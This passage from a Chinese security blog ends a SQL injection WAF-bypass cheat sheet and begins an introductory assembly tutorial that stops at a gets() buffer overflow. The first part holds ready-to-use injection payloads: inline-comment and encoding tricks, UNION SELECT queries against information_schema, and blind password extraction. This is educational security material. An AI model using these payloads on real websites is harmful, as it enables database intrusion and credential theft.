</code></pre><p>&emsp;&emsp;两个示例中，前者利用双字节绕过，比如对单引号转义操作变成\，那么就变成了%D6%5C，%D6%5C构成了一个款字节即Unicode字节，单引号可以正常使用第二个示例使用的是两种不同编码的字符的比较，它们比较的结果可能是True或者False，关键在于Unicode编码种类繁多，基于黑名单的过滤器无法处理所以情况，从而实现绕过<br>&emsp;&emsp;另外平时听得多一点的可能是utf-7的绕过，还有utf-16、utf-32的绕过，后者从成功的实现对google的绕过，有兴趣的朋友可以去了解下常见的编码当然还有二进制、八进制，它们不一定都派得上用场，但后面会提到使用二进制的</p>
<p>例子:</p>
<ol start="4">
<li><p>使用注释</p>
<p> 看一下常见的用于注释的符号有哪些：</p>
<p> //, – , /**/, #, –+,–  -, ;，–a</p>
</li>
</ol>
<ul>
<li>普通注释</li>
</ul>
<p>举例：<br>z.com/index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4</p>
<p>&emsp;&emsp;/**/在构造得查询语句中插入注释，规避对空格的依赖或关键字识别;#、–+用于终结语句的查询</p>
<ul>
<li>内联注释</li>
</ul>
<p>&emsp;&emsp;相比普通注释，内联注释用的更多，它有一个特性/!**/只有MySQL能识别</p>
<p>举例:<br>index.php?page_id=-15 /<em>!UNION</em>/ /<em>!SELECT</em>/ 1,2,3</p>
<blockquote>
<p>?page_id=null%0A/<strong>//<em>!50000%55nIOn</em>//<em>yoyu</em>/all/</strong>/%0A/<em>!%53eLEct</em>/%0A/<em>nnaa</em>/+1,2,3,4…</p>
</blockquote>
<p>&emsp;&emsp;两个示例中前者使用内联注释，后者还用到了普通注释。使用注释一个很有用的做法便是对关键字的拆分，要做到这一点后面讨论的特殊符号也能实现，当然前提是包括/、*在内的这些字符能正常使用</p>
<ol>
<li><p>等价函数与命令<br> 有些函数或命令因其关键字被检测出来而无法使用，但是在很多情况下可以使用与之等价或类似的代码替代其使用</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hex()、bin() ==&gt; ascii()</span><br><span class="line">sleep() ==&gt;benchmark()</span><br><span class="line">concat_ws()==&gt;group_concat()</span><br><span class="line">mid()、substr() ==&gt; substring()</span><br><span class="line">@@user ==&gt; user()</span><br><span class="line">@@datadir ==&gt; datadir()</span><br></pre></td></tr></table></figure>
<p> 例如:<br> substring()和substr()无法使用时：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1+and+ascii(lower(mid((<span class="keyword">select</span>+pwd+<span class="keyword">from</span>+<span class="keyword">users</span>+<span class="keyword">limit</span>+<span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))=<span class="number">74</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<pre><code>1. 特殊符号
利用反引号等符号,或用@定义变量,或用+号连接被拆分的字符串

1. HTTP参数控制
重复发送同一个参数,不太常见

1. 缓冲区溢出
跟基于报错那个差不多

1. 整合绕过
把前面说的合起来
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">z.com/index.php?page_id=-15+and+(<span class="keyword">select</span> <span class="number">1</span>)=(<span class="keyword">Select</span> <span class="number">0xAA</span>[..(<span class="keyword">add</span> about <span class="number">1000</span> <span class="string">"A"</span>)..])+<span class="comment">/*!uNIOn*/</span>+<span class="comment">/*!SeLECt*/</span>+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">id</span>=<span class="number">1</span><span class="comment">/*!UnIoN*/</span>+<span class="keyword">SeLeCT</span>+<span class="number">1</span>,<span class="number">2</span>,<span class="keyword">concat</span>(<span class="comment">/*!table_name*/</span>)+<span class="keyword">FrOM</span> <span class="comment">/*information_schema*/</span>.tables <span class="comment">/*!WHERE */</span>+/  *!TaBlE_ScHeMa*/+<span class="keyword">like</span>+<span class="keyword">database</span>() -</span><br><span class="line">?<span class="keyword">id</span>=<span class="number">-725</span>+<span class="comment">/*!UNION*/</span>+<span class="comment">/*!SELECT*/</span>+<span class="number">1</span>,<span class="keyword">GrOUp_COnCaT</span>(COLUMN_NAME),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>+<span class="keyword">FROM</span>+<span class="comment">/*!INFORMATION_SCHEM*/</span>.COLUMNS+<span class="keyword">WHERE</span>+TABLE_NAME=<span class="number">0x41646d696e</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>

速记:
- 空格过滤: 
  - 注释
  - %20 %09 %0a %0d %0b %0c %0d %a0等url编码
- 逗号过滤
  - 用JOIN()绕过
  - 用select绕过

[参考文章](http://drops.xmd5.com/static/drops/tips-7840.html)
</code></pre>
        
      
    
    </div>
    
  </article>
  
  
    
  

  
    
  


  <article class="
  post
  
  ">
    <header class="post-header">
      <div class="post-time syuanpi fadeInUpShort back-1">
        <div class="post-time-wrapper">
          <span>2019-12-08</span>
          
          
        </div>
      </div>
      <h1 class="post-title syuanpi fadeInUpShort back-2">
        
          <a href="/2019/12/08/assembly/">汇编文档整理</a>
        
      </h1>
    </header>
    <div class="post-content syuanpi fadeInUpShort back-3">
      
        
          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;本文旨在带领你快速了解汇编的特点以及程序运行的基本过程.让你体验专业而粗暴的攻击方式.下面我们简单介绍一下你需要了解哪些知识. </p>
<ol>
<li>汇编基础  </li>
<li>基本逆向工程  </li>
<li>简单调试技巧  </li>
<li>函数运行时栈的构造与内存分布  </li>
<li>基本Linux基础</li>
<li>缓冲区溢出漏洞利用  </li>
</ol>
<blockquote>
<p>本文将对比x86与x86-64程序,即32位与64位,主流机器大部分运行64位程序,但32程序运行的原理十分重要(主要体现在函数调用部分)  </p>
</blockquote>
<p>建议阅读的资料：</p>
<ul>
<li>汇编语言(王爽)<ul>
<li>此书主要介绍8086汇编,虽然8086已经淘汰,但是对理解计算机驱动层十分有益,笔者花了15天读完,建议阅读</li>
</ul>
</li>
<li>深入理解计算机系统  <ul>
<li>本书为卡内基梅隆大学教材,内容之精妙无法描述orz,全书732页笔者读了一半,打算多刷几遍,强推!!!  </li>
</ul>
</li>
<li>程序员的自我修养  <ul>
<li>听名字像是颈椎病康复指南之类的书,实际上讲的是编译时链接装载的过程,硬核玩家必看</li>
</ul>
</li>
<li>SICP  <ul>
<li>这是魔法!!!</li>
</ul>
</li>
</ul>
<blockquote>
<p>希望在你读完这篇文章的时候能够拿下你的第一台主机.  </p>
</blockquote>
<hr>
<h2 id="汇编基础"><a href="#汇编基础" class="headerlink" title="汇编基础"></a>汇编基础</h2><h3 id="为啥要学汇编"><a href="#为啥要学汇编" class="headerlink" title="为啥要学汇编"></a>为啥要学汇编</h3><p>&emsp;&emsp;汇编是逆向工程的基础,许多人都希望能够破解软件,制作游戏外挂,不花钱冲会员等等,这都属于逆向工程的范畴.逆向工程就是在只有二进制文件的时候,我通过反汇编的手段来从二进制文件获得汇编代码,进而对汇编代码进行反编译得到类C的高级语言,以辅助我们了解程序逻辑,挖掘程序漏洞.  </p>
<p>&emsp;&emsp;同时,逆向工程是学习C/C++最好的途径.C系语言本就是为了开发Unix而生,因此他完美的契合Unix生态,因此在Linux下你可以轻易的获得一个程序的指令码(opcode),汇编代码,以及未链接的目标文件.而你学到现在可能都不知道main函数有三个参数,为什么main函数一定要写<code>return 0;</code>(虽然你不写,但这是十分差劲的习惯).只有通过阅读汇编代码你才能真正理解程序的运行原理,你才能真正的理解编译的的高明之处,你才能真正领略到前人的伟大智慧.我强烈建议同学们安装ubuntu18.04虚拟机进行实验,这样你才能获得最好的体验.  </p>
<p>&emsp;&emsp;我知道现在流行一种歪风邪气,由于互联网市场膨胀,资本大量流入,大量公司需求网站开发与移动端开发.因此一些学生急功近利,认为自己会写几行php,套个框架,api倒背如流,就算编程大牛了.认为自己会写几行python java,调一调库,用一用flask spring搭个网站,整天拿一些现有的库高谈扩论,写一些业务逻辑,搞几个微信小程序就算是高级程序员了.反而嘲笑C/C++老掉牙,内心浮躁而不愿了解底层,这本身就是一种自欺欺人.多数人由于畏难心理而拒绝C++,只推崇语法糖更加简单的python.作为计算机科学研究人员,我们决不能满足于只写一些应用层逻辑,只有真正了解了计算机的细节,我们才能成为大师,否则你与专科培训班的学生有什么区别.</p>
<h3 id="从Hello-world开始"><a href="#从Hello-world开始" class="headerlink" title="从Hello_world开始"></a>从Hello_world开始</h3><p>&emsp;&emsp;你向家里的弟弟妹妹炫耀你的编程技巧时,你可能写过无数次Hello_world来骗他们了,也许你自认为对它十分熟悉,下面我们从头看看到底发生了什么.<br>&emsp;&emsp;首先你会熟练的写一个hello.c:  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[], <span class="keyword">char</span> *envp[])</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Hello World!"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;或许你在dev-c++里熟练的按下F11,不过在linux终端里,我们使用GNU开源编译器gcc进行编译,命令如下:  </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> gcc -o hello hello.c</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;在这里,gcc驱动程序读取源程序文件hello.c,并把它翻译成一个可执行的二进制文件,这个翻译过程可分为四个阶段,如下图.这四个阶段的程序(预处理器 编译器 汇编器 链接器)构成了编译系统(Compilation System)</p>
<p><img src="./pictures/com.png" alt="compilation system">  </p>
<ul>
<li>预处理阶段: 预处理器(cpp)根据一字符#开头的命令修改原始C程序.比如hello.c的第一行<code>#include&lt;stdio.h&gt;</code>命令告诉预处理器读取系统头文件stdio.h的内容,并把它直接插入文本程序中.结果就的到了另一个C程序,通常以”.i”作为后缀.  </li>
<li>编译阶段: 编译器(ccl)将文本文件hello.i翻译成文本文件hello.s,他包含一个汇编程序,该程序的main函数定义,如下:  </li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">main:</span><br><span class="line">    subq    $8, %rsp</span><br><span class="line">    movl    $.LC0, %edi</span><br><span class="line">    call    puts</span><br><span class="line">    movl    $0, %eax</span><br><span class="line">    addq    %8, %rsp</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;2~7行的每一条汇编语句都描述了一条低级机器语言指令,汇编的牛啤之处就在于它为不同的高级语言的不同编译器提供了通用的输出语言,相当与对底层进行了封装,统一了接口.这是很了不起的一项成就.</p>
<ul>
<li>汇编阶段: 接下来,汇编器(as)将hello.s翻译成机器语言指令,把这些指令打包成可重定位目标程序(relocatable object program)hello.o,hello.o是一个二进制文件,如果你用记事本打开他将看到一堆乱码.  </li>
<li>链接阶段: 注意,hello调用了printf函数,这是C标准库所提供的函数,printf存在于一个叫printf.o的单独预编译好了的目标文件中,我们必须使用某种神秘魔法将hello.o与printf.o融合起来,这就是链接器的工作,最后我们就得到了hello文件,这是一个可执行目标文件,可以被加载到内存中,由系统执行.  </li>
</ul>
<p>&emsp;&emsp;最后,尝试在Linux终端里运行你的程序:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> ./hello</span></span><br><span class="line"></span><br><span class="line">Hello World!#</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;到此为止我们已经稍微了解了Hello_world,当学弟学妹在你面前吹牛的时候,你就可以问他:你知道Hello_world有多复杂吗?</p>
<h3 id="汇编风格"><a href="#汇编风格" class="headerlink" title="汇编风格"></a>汇编风格</h3><p>&emsp;&emsp;从传统上来说,汇编有两种风格,一种是AT&amp;T风格,一种是Intel风格.AT&amp;T是Linux默认格式,而Intel则是微软默认格式.两种风格没有好坏之分,下面我们介绍一下他们的区别.我们还是以一个程序为例,首先我们写一个mstore.c文件如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">mult2</span><span class="params">(<span class="keyword">long</span>, <span class="keyword">long</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">multstore</span><span class="params">(<span class="keyword">long</span> x, <span class="keyword">long</span> y, <span class="keyword">long</span> *dest)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">long</span> t = mult2(x, y);</span><br><span class="line">    *dest = t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;接下来,我们编译这个程序,在命令中使用’-S’选项可以生成汇编代码:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> gcc -Og -S mstore.c</span></span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>此处’-Og’代表不进行优化,编译器会默认对你写的垃圾代码进行优化  </p>
</blockquote>
<p>&emsp;&emsp;接下来你会发现生成了一个mstore.s,里面有各种声明,但是包括如下几行:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">;AT&amp;T style:</span><br><span class="line">multstore:</span><br><span class="line">pushq	%rbx</span><br><span class="line">movq	%rdx,  %rbx</span><br><span class="line">call		 mult2</span><br><span class="line">movq	%rax, (%rbx)</span><br><span class="line">popq	%rbx</span><br><span class="line">ret</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;以上代码描述了一系列机器指令,你会注意到里面有各种<code>%rax</code>之类的东西,这些%开头的东西就是寄存器(Register).他们是cpu中的储存单元,cpu所进行的一切进算都必须由寄存器储存,同时它也是速度最高的存储单元.我们可以把寄存器理解为局部变量,他用来存储某个函数调用所需要的数据.  </p>
<p>&emsp;&emsp;以上这种带%的汇编就是AT&amp;T风格,他的阅读顺序是从左往右,就像是说话一样自然.而<code>pushq movq</code>等等是一些指令,他们实际上就是英文单词push和mov(即move的缩写),至于为什么后面加了一个’q’,是因为q描述了mov后面的数据的大小.q代表”4字”(quad words)即一个64位数,即<code>%rdx</code>与<code>%rbx</code>中存储了long类型的数.而<code>movq    %rdx, %rbx</code>的意思就如同字面意思一样,把<code>%rdx</code>里的数据移动到<code>%rbx</code>里.这就好比C语言中的赋值操作:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%rbx = %rdx</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>注: 由于是从16位体系结构扩展为32位的,Intel使用术语 “字(word)”来表示16位数据. 因此称32位数为”双字(double words)”,称64位数为”4字(quad words)”.<br>在C语言中,int为32位即”双字”,4个字节.大家要清楚一点,位(bit) 字节(byte)在任何情况下都是没有歧义的,一个字节就是8位.但是字(word)随着语境的不同大小会发生变化,在这里特指16位,在其他文章中应根据上下文判断.</p>
</blockquote>
<p>&emsp;&emsp;接下来我们给出该程序Intel风格的代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">multstore:</span><br><span class="line">	push	rbx</span><br><span class="line">	mov		rbx, rdx</span><br><span class="line">	call 	   mult2</span><br><span class="line">	mov 	QWRD PTR [rbx], rax</span><br><span class="line">	pop		 rbx</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;你可以使用<code>gcc -Og -S -masm=intel mstore.c</code>获得该代码,我们可以看到他与AT&amp;T有以下几点不同:</p>
<ul>
<li>Intel 代码省略了指令的后缀,我们看到push和mov而不是pushq和movq.  </li>
<li>Intel 代码省略了寄存器前的%,用的是rbx,而不是%rbx</li>
<li>Intel 代码用<code>QWRD    PTR    [rbx]</code>来描述内存中的内容,而不是<code>(%rbx)</code></li>
<li>Intel 代码目标与对象与AT&amp;T的相反,比如<code>mov rbx, rdx</code>等价于<code>rbx = rdx</code>,在AT&amp;T中要写成<code>movq %rdx, %rbx</code> </li>
</ul>
<hr>
<p>&emsp;&emsp;下面我面介绍一下上面出现的几条指令:  </p>
<ul>
<li><p><code>mov</code>: 他是一个传递指令,表示把数据从一处传递到另一处,你可以简单把他理解为赋值语句</p>
<ul>
<li>然而mov的操作对象只有如下几种情况:<ol>
<li><code>mov    rax, rbx</code>=&gt; <code>rax = rbx</code> 即从寄存器到寄存器  </li>
<li><code>mov [rax], rbx</code> =&gt; <code>*rax = rbx</code> 即从寄存器到内存  </li>
<li><code>mov rax, [rbx]</code> =&gt; <code>rax = *rbx</code> 即从内存到寄存器  </li>
<li><code>mov rax, 3</code>  =&gt; <code>rax = 3</code>即将立即数赋值给rax  </li>
<li><code>mov [rax], 3</code>    =&gt; <code>*rax = 3</code> 即将立即数存储在内存  <blockquote>
<p>无论如何都不能<code>mov [rax], [rbx]</code> 即不可从内存到内存  </p>
<blockquote>
<p> 至于<code>[rax]</code>是什么东西.<code>[]</code>是寻址运算符号就相当与C语言中的<code>*</code>,他会把<code>[rax]</code>中的rax当作指针,去访问rax储存的地址所指向位置的内容.比如,<code>mov [rax], 3</code>相当于<code>*rax = 3</code>.<br> 更加复杂的寻址方式暂时跳过  </p>
</blockquote>
</blockquote>
</li>
</ol>
</li>
</ul>
</li>
<li><p><code>push</code>: 相信大家应该都用过C++里面的Vector了,应该都比较熟悉push和pop了.push和pop本就是为了栈(Stack)这种数据结构所设计的,<code>push</code>和<code>pop</code>分别描述了入栈和出栈的操作.</p>
</li>
</ul>
<p><img src="./pictures/Data_stack.png" alt="data_stack"></p>
<p>&emsp;&emsp;push就是将数据推入栈中,pop则是从栈中弹出.看似简单的数据结构是则是为了适应工业要求而诞生的产物.在同学们的印象里stack似乎是为了做算法题才创造出来的,实则不是,上古时期,科学家在研究函数调用时发现,他们需要一种能够保存当前状态的东西,这样才能实现函数的递归调用.这样解释可能还是有些抽象.我们举个例子,相信大家都看过&lt;&lt;盗梦空间&gt;&gt;这部电影,我们可以在梦里做梦,深入好几层梦境,其实这就类似与函数的递归,但是如果想要进入下一层梦境,你就必须要储存好当前的状态,这样一来,当你每次醒来时,你都处在之前保存好的状态之中.对于函数而言,每次从内层调用中返回,你都要恢复调用之前的状态,例如:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">A</span><span class="params">()</span></span>&#123;</span><br><span class="line">    B();</span><br><span class="line">    b = a + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;我们看到A()函数调用了B();那么我们首先要清楚一件事,当B()运行结束之后会发生什么?  </p>
<p>&emsp;&emsp;显然要接着继续执行A()后面的指令,那么我们要怎样才能在B()运行结束后回到A()内并继续执行<code>b = a + 1</code>呢?很显然,我们必须在执行B()之前就提前保存好当前的所有状态,并且把B()返回后要执行的下一条指令提前储存起来.这样我们才能在每一次函数调用结束后回到原来的位置并继续向下执行.  </p>
<p>&emsp;&emsp;想到这里,似乎stack就是最好的实现方式.在每一次进行函数调用的时候就把当前的相关寄存器的值push进stack,并且把被调函数结束后的返回地址也push进stack,这样以来,当函数结束时,我们只需要把相关数据再pop到对应的寄存器,我们就相当于恢复了调用前的状态,类似于游戏的”存档与读档”的操作.如果我们要实现递归调用,那么我们只需要在每一次调用时建立起新的stack frame即栈帧,每个函数都有自己的栈帧,每个栈帧存储着对应函数调用的数据.因此我们只需要一直push,为每次递归建立新的栈帧,在返回时将对应栈帧的内容pop出来就能完美的实现递归调用.</p>
<blockquote>
<p>对于栈本身而言,它是人为规定的出来的.我相信很多人仍这种误解:他们认为stack实际存在与计算机中,他们还信誓旦旦的说内存里还有堆(heap),每次malloc或者new就会从堆里面开辟空间,而函数却只会开栈,所以栈和堆实际存在.</p>
<blockquote>
<p>这种想法是极端错误的,产生这种想法的原因是老师上课讲的比较笼统,而且他们确实是这么说的…其实,stack与heap并不存在,他们是我们人为从内存里划分一部分并且给他们取名叫stack或者heap,他们与其他内存空间并没有本质区别,并不是说内存中的某一段天生就具有push和pop的特效,或者说只是由于前辈使用了一些黑魔法才把普通的内存搞出了stack的功能.</p>
<blockquote>
<p>按照规矩,我们更应该称之为Stack Segment即”栈段”以及Heap Segment即”堆段”,因为stack与heap都是内存上的一段.实际上在程序运行时会创建许多的段(segment),比如代码段(Text Segment) BSS段(BSS Segment)等等.我想大家在C/C++编程时经常看到segment这个单词只是你没有留意.一般,你如果产生了内存错误,比如越界访问,就会导致Segment Fault,即”段错误”,国内一个还算不错的代码论坛”思否”正是取名于此.下面给大家一个内存宏观图:</p>
</blockquote>
</blockquote>
</blockquote>
<p><img src="./pictures/memory.png" alt="memory"></p>
<p>&emsp;&emsp;我们在这里只是简单的介绍一下原理,更多的细节在后面会分析.</p>
<ul>
<li><code>call</code>: 正如其字面意思,就是调用某个函数的意思,其参数是一段地址  </li>
<li><code>pop</code>: 其参数应为应为某寄存器,效果是将栈顶数据弹出至目标寄存器.  </li>
<li><code>ret</code>: 即函数返回  <ul>
<li>这里又要强调一下,有一个错误观点:许多人认为函数没有返回值就不需要返回.这个观点是极端错误的.返回的真正意义是:当前被调用函数(called function)执行结束后,回到上层调用函数(callee function)的过程.而返回值仅仅是函数向外层传递出的结果,函数会把想要传递出的结果在返回之前放入%rax寄存器,这个值就叫返回值.  </li>
<li>实际上<code>ret</code>等价于<code>pop %rip</code>  这里很重要,后文会详细说明.</li>
</ul>
</li>
</ul>
<h3 id="关于常用寄存器介绍"><a href="#关于常用寄存器介绍" class="headerlink" title="关于常用寄存器介绍"></a>关于常用寄存器介绍</h3><p>&emsp;&emsp;cpu的一切活动都是基于寄存器的,你可以把寄存器理解为变量,函数运行所产生的中间变量优先使用寄存器存储,若寄存器存不下则存入内存即栈中,或者用户主动选择分配一段内存即在堆区分配内存用于存储数据.</p>
<p>&emsp;&emsp;先给大家一张寄存器的图:</p>
<p><img src="./pictures/register.png" alt="register">  </p>
<p>&emsp;&emsp;我们可以看到图中写了一些你根本看不懂的东西(%rax之类的),那就是寄存器的名字,首先这附图的最右边介绍了各种寄存器的作用,比如%rax的作用是储存”Return value”,即储存返回值.接着我们看图的最上面写着几个神秘数字<code>0 7 8 15 31 63</code>,这一串神秘数字代表了寄存器的大小,你可以清楚的看到,当寄存器的大小不同时,他们的名字似乎不太一样.比如%rax包括了%eax,而%eax包括了%ax,%ax又包括了%ah和%al.为啥好端端的寄存器要分这么细呀?这是由于历史原因造成的.  </p>
<p>&emsp;&emsp;传说,在上古时期,人们还处于只有16位cpu的蛮荒时代,上古大神编程也使用8086汇编.那个时候一个寄存器的大小最大也只有16位,就是上图%ax %bx那一列.可见古代程序员编程条件比较艰苦,虽然寄存器只有16位,但是他们又想实现一些黑魔法来优化算法,这就需要更加细致的操作寄存器,因此他们又把寄存器分成了高8位与低8位两部分,即%ah与%al.  </p>
<blockquote>
<p>顺便一提:那个时候,想要访问内存是一件很繁琐的事情,由于当时的寄存器只有16位,但是地址的寻址范围确实20位,也就是说一个寄存器是存不下一个完整的地址的,因此大佬们决定用两个寄存器存地址,他们决定用”基址+偏移”的方式储存地址.好了我知道你开始听不懂了,举个栗子:  </p>
<p>从郊区9斋到老麻抄手距离8848km,到逸夫楼8000Km,现在我有个要求:你只用两个寄存器,每个寄存器不超过三位,让你几下这个距离.你如何操作?  </p>
<ul>
<li>凡夫俗子: 这还不简单,直接从中间分开呗? <ul>
<li>88  48  俩数,一个才两位,我真nb</li>
</ul>
</li>
<li>大佬: 优化一下<ul>
<li>800  848  (真实地址 = 基地址<em>偏移+偏移地址) `800 </em> 10 + 848`</li>
</ul>
</li>
</ul>
</blockquote>
<p>&emsp;&emsp;其实道理很简单,正常人简单的把十进制数分成两半实际上也是基址+偏移的一种,但是由于设计错误,导致基址和偏移要同时发生改变.比如,假如今天想换个口味,想吃九本拉面了,距离变成了8747Km,<code>87 47</code>相对于<code>88 48</code>变了两个数.而<code>800 848</code>相对于<code>800 747</code>来说只变了一个偏移,这样就可以减少一次修改寄存器的操作. </p>
<blockquote>
<p>这种寻址方式称之为”间址寻址”(因为是间接的嘛),由于现在的寄存器都容量很大所以这种寻址方式变得不再常见,但是这种神奇的思想依然十分重要,在函数建立栈帧的时候依然使用间址寻址的方式,请大家反复思索并理解.</p>
</blockquote>
<p>&emsp;&emsp;如今大家的程序基本都是64位的,即x86-64所以寄存器一般是”r”开头的,比如%rax之类的,四五年前流行32位的程序,即x86,寄存器大小一般是32位,以”e”开头,比如%eax.如今的机器为了向下兼容以前的程序,仍然保留之前的寄存器模型,所以%rax的低32位仍然是%eax,就像图中显示的那样.</p>
<p>&emsp;&emsp;有些寄存器具有特殊的功能,比如%rip  %rsp  %rbp等等,稍微介绍一下:  </p>
<ul>
<li><p>%rip: 指令指针(Instruction Pointer)寄存器,因此在8086中被缩写为ip,32位时为%eip.  </p>
<ul>
<li>作用是存储下一条要执行的指令的地址 </li>
<li>敲重点! 假如能够修改这个寄存器,那么我们似乎就可以控制程序流程,进而控制整个计算机系统  </li>
<li>你不能像访问通用寄存器那样访问它,即找不到可用来寻址EIP并对其进行读写的操作码(OpCode).EIP可被jmp、call和ret等指令隐含地改变(事实上它一直都在改变).</li>
</ul>
</li>
<li><p>%rsp: 栈顶指针(Stack Pointer)寄存器,8086中为sp,32位为%esp  </p>
<ul>
<li>众所周知stack具有底(第一个入栈的)和顶(最后一个入栈的),rsp指向栈顶</li>
</ul>
</li>
<li><p>%rbp: 栈基指针(Base Pointer)寄存器,8086中为bp,32位为%ebp  </p>
<ul>
<li>与%rsp对应,%rbp指向栈底  </li>
<li>也就是说这俩寄存器指向内存中的栈段(stack segment)</li>
</ul>
</li>
<li><p>%rdi %rsi %rdx  %rcx  %r8  %r9: 在x86-64位程序中,分别是调用函数时传递参数时使用的,若有更多参数,则存入栈中.例如:</p>
<ul>
<li><code>printf(&quot;%d %d %d %d %d %d %d&quot;,1,2,3,4,5,6,7);</code>则1-6分别存在%rdi - %r9中,’7’则存于栈上.  </li>
<li>需要注意的是x86程序,即32位程序的传参方式与64位区别很大,32位程序的参数传递完全依靠栈.</li>
</ul>
</li>
</ul>
<blockquote>
<p>扩展阅读</p>
<blockquote>
<p>为了访问函数局部变量，必须能定位每个变量。局部变量相对于堆栈指针ESP的位置在进入函数时就已确定，理论上变量可用ESP加偏移量来引用，但ESP会在函数执行期随变量的压栈和出栈而变动。尽管某些情况下编译器能跟踪栈中的变量操作以修正偏移量，但要引入可观的管理开销。而且在有些机器上(如Intel处理器)，用ESP加偏移量来访问一个变量需要多条指令才能实现。</p>
<p>因此，许多编译器使用帧指针寄存器FP(Frame Pointer)记录栈帧基地址。局部变量和函数参数都可通过帧指针引用，因为它们到FP的距离不会受到压栈和出栈操作的影响。有些资料将帧指针称作局部基指针(LB-local base pointer)。</p>
<p>在Intel CPU中，寄存器BP(EBP)用作帧指针。在Motorola CPU中，除A7(堆栈指针SP)外的任何地址寄存器都可用作FP。当堆栈向下(低地址)增长时，以FP地址为基准，函数参数的偏移量是正值，而局部变量的偏移量是负值。</p>
</blockquote>
</blockquote>
<blockquote>
<p>请同学们务必记牢我上面提到的寄存器的作用,都是英文缩写,不难记.  </p>
</blockquote>
<h4 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h4><p>&emsp;&emsp;基本的指令其实没有几条,上面已经介绍不少了,我们再介绍几个常用的就可以开始实战了,下面我们看个例子:</p>
<p><img src="./pictures/example.png" alt="example"></p>
<p>&emsp;&emsp;首先可以告诉大家这个程序是有严重漏洞的,可以导致系统被”get shell”(就是说拿到最高控制权限啦).  </p>
<p><img src="./pictures/example1.png" alt="example1"></p>
<p>&emsp;&emsp;这是老师课件上的例题,这就是教科书式的漏洞,这段程序与上边的汇编的区别就是输出的方式不同,汇编里用的puts()函数,下面使用了for loop进行输出.其他的基本一致.漏洞就发生在被标红的gets函数那里,我记得这一课讲的是如何把输入的空格读进来,因为cin不行,所以选择了gets()函数.在此强调:  </p>
<blockquote>
<p>永远都不要使用gets()函数,他对输入长度没有限制与检查,会爆栈,造成严重的缓冲区溢出.  </p>
